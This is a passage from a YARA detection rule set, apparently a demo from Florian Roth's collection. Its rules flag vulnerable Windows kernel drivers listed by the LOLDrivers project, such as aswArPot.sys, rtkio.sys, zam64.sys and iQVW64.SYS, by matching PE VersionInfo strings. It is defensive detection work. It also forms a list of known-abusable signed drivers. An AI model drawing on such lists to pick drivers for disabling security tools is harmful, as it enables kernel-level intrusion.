\"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005300420049004f00530049004f0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030003000300030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030003000300030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]005300420049004f00530049004f00360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00530061006d00730075006e00670020002800520029002000420049004f005300200049004f0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]005300420049004f00530049004f00360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000530061006d00730075006e006700200045006c0065006300740072006f006e006900630073002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avgtechnologiesczsro_Aswarpot_Avginternetsecuritysystem_9491_RID4501 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:17:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410056004700200041006e0074006900200052006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00320030002e0034002e00380033002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00320030002e0034002e00380033002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410056004700200049006e007400650072006e00650074002000530065006300750072006900740079002000530079007300740065006d0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000320030002000410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Fujitsulimited_Advdrvsys_Microsoftrwindowsroperatingsystem_04A8_RID466A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ADV64DRV.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:17:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00460055004a00490054005300550020004c0049004d0049005400450044002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002c00200030002c00200030002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00410044005600360034004400520056002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d006900630072006f0073006f006600740052002000570069006e0064006f0077007300520020004f007000650072006100740069006e0067002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00410044005600360034004400520056002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002800430029002000460055004a00490054005300550020004c0049004d004900540045004400200032003000300035 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Advancedmicrodevices_Amdryzenmasterdriversys_Amdryzenmasterservicedriver_FF96_RID4C04 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - AMDRyzenMasterDriver.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 08:16:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041004d0044002000520079007a0065006e0020004d00610073007400650072002000530065007200760069006300650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041006400760061006e0063006500640020004d006900630072006f00200044006500760069006300650073 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0034002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0034002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0041004d004400520079007a0065006e004d00610073007400650072004400720069007600650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041004d0044002000520079007a0065006e0020004d00610073007400650072002000530065007200760069006300650020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0041004d004400520079007a0065006e004d00610073007400650072004400720069007600650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a90020003200300031003900200041004d0044002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sunmicrosystemsinc_Vboxtapsys_Virtualboxhostinterfacenetworkingdriver_CFA2_RID4B36 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - VBoxTAP.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 07:42:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072007400750061006c0042006f007800200048006f0073007400200049006e00740065007200660061006300650020004e006500740077006f0072006b0069006e00670020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00530075006e0020004d006900630072006f00730079007300740065006d0073002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0038002f0032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0038002f0032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00560042006f0078005400410050002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005600690072007400750061006c0042006f007800200048006f0073007400200049006e00740065007200660061006300650020004e006500740077006f0072006b0069006e00670020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00560042006f0078005400410050002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00530075006e0020004d006900630072006f00730079007300740065006d0073002c00200049006e0063002e002000260020004f00740068006500720073 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Generalelectriccompany_Gedevicedriver_Proficymachineedition_Build_A369_RID4859 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - GEDevDrv.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 05:40:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0047004500200044006500760069006300650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00470065006e006500720061006c00200045006c00650063007400720069006300200043006f006d00700061006e0079 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0039002e0035003000200028004200750069006c0064002000370036003700370029 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0039002e0035003000200028004200750069006c0064002000370036003700370029 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0047004500200044006500760069006300650020004400720069007600650072 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00500072006f00660069006300790020004d0061006300680069006e0065002000450064006900740069006f006e } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00470045004400650076004400720076002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a900200032003000310037002000470065006e006500720061006c00200045006c00650063007400720069006300200043006f006d00700061006e0079 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Ngiodriversys_Avastng_85FD_RID3C8F : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ngiodriver.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:17:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0061007600610073007400210020004e0047002000730065007400750070002000680065006c0070006500720020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310030002e0030002e0030002e00360039 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310030002e0030002e0030002e00360039 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e00670069006f006400720069007600650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004100760061007300740020004e0047 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e00670069006f006400720069007600650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003400200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_7CF7_RID3BCC : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:44:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f00770073002000780036003400200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003700200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sysinternalswwwsysinternalscom_Procexpsys_7795_RID3F81 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - procexp.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:22:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0053007900730069006e007400650072006e0061006c00730020002d0020007700770077002e0073007900730069006e007400650072006e0061006c0073002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310035002e00300030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310035002e00300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00700072006f0063006500780070002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00700072006f0063006500780070002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020004d00610072006b002000520075007300730069006e006f007600690063006800200031003900390036002d0032003000310034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sisoftware_Sandra_Sisoftwaresandra_B019_RID3BDE : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - SANDRA.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:47:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00530061006e006400720061002000440065007600690063006500200044007200690076006500720020002800570069006e003300320020007800380036002900280055006e00690063006f006400650029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005300690053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310030002e0037002e0031002e00310020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310030002e0037002e0031002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00530041004e004400520041 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005300690053006f006600740077006100720065002000530061006e006400720061 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00530041004e004400520041 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a90020005300690053006f0066007400770061007200650020004c0074006400200031003900390035002d0032003000300037002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Advancedmicrodevicesinc_Amdpowerprofilersys_Amduprof_0AF5_RID435A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - AMDPowerProfiler.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 02:06:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041004d004400200050006f007700650072002000500072006f00660069006c0069006e00670020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041006400760061006e0063006500640020004d006900630072006f00200044006500760069006300650073002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0031002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0034002e003400390033002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0041004d00440050006f00770065007200500072006f00660069006c00650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041004d00440020007500500072006f0066 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0041004d00440050006f00770065007200500072006f00660069006c00650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a90020003200300032003100200041004d004400200049006e0063002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Realtek_Rtkiosys_Realtekiodriver_074A_RID3B1A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtkio.sys, rtkio64.sys, rtkiow8x64.sys, rtkiow10x64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:14:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005200650061006c00740065006b00200049004f0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200650061006c00740065006b00200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e003000300036002e0030003100310038002e00320030003100370020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e003000300036002e0030003100310038002e0032003000310037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00720074006b0069006f00360034002e0073007900730020 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005200650061006c00740065006b00200049004f00200044007200690076006500720020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00720074006b0069006f00360034002e0073007900730020 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100370020005200650061006c00740065006b002000530065006d00690063006f006e0064007500630074006f007200200043006f00720070006f0072006100740069006f006e002e00200041006c006c002000520069006700680074002000520065007300650072007600650064002e002000200020002000200020002000200020002000200020 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Msi_Ntiolibsys_Ntiolib_98B7_RID36F6 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - NTIOLib.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:18:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00540049004f004c0069006200200066006f0072002000440065006200750067004c00450044 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d00530049 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00540049004f004c00690062 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100330020004d00530049002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtierforwindows_V_7A2C_RID3BBD : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nicm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:42:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c00200043006c00690065006e007400200050006f00720074006100620069006c0069007400790020004c0061007900650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00760033002e003100200028003200300030003600300038003000380029 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c00200058005400690065007200200066006f0072002000570069006e0064006f00770073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00490043004d002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200031003900390037002d00320030003000370020004e006f00760065006c006c002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Zemanaltd_Zam_9A95_RID3333 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - zam64.sys, zamguard32.sys, zamguard64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 14:37:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005a0041004d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005a0065006d0061006e00610020004c00740064002e } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e00310036002e003200380037 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005a0041004d } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]005a0065006d0061006e00610020004c00740064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Intelcorporation_Iqvwsys_Intelriqvwsys_19BF_RID3E1A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - iQVW64.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:22:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049006e00740065006c0028005200290020004e006500740077006f0072006b0020004100640061007000740065007200200044006900610067006e006f00730074006900630020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e00740065006c00200043006f00720070006f0072006100740069006f006e0020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00300033002e0030002e00340020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00300033002e0030002e0034 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0049006e00740065006c0028005200290020006900510056005700360034002e005300590053 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300032002d003200300031003100200049006e00740065006c00200043006f00720070006f0072006100740069006f006e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Zemanaltd_Zam_2BBC_RID3344 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - zam64.sys, zamguard32.sys, zamguard64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 14:40:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005a0041004d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005a0065006d0061006e00610020004c00740064002e } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e00310038002e003300370031 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005a0041004d } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]005a0065006d0061006e00610020004c00740064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Logitechinc_Lvavsys_Logitechwebcamsoftware_E86C_RID3F42 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - Lv561av.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:12:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c006f00670069007400650063006800200056006900640065006f0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004c006f00670069007400650063006800200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310032002e00300030002e0031003200370038002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310032002e00300030002e0031003200370038002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004c007600350036003100610076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004c006f006700690074006500630068002000570065006200630061006d00200053006f006600740077006100720065 } \n      $ = { 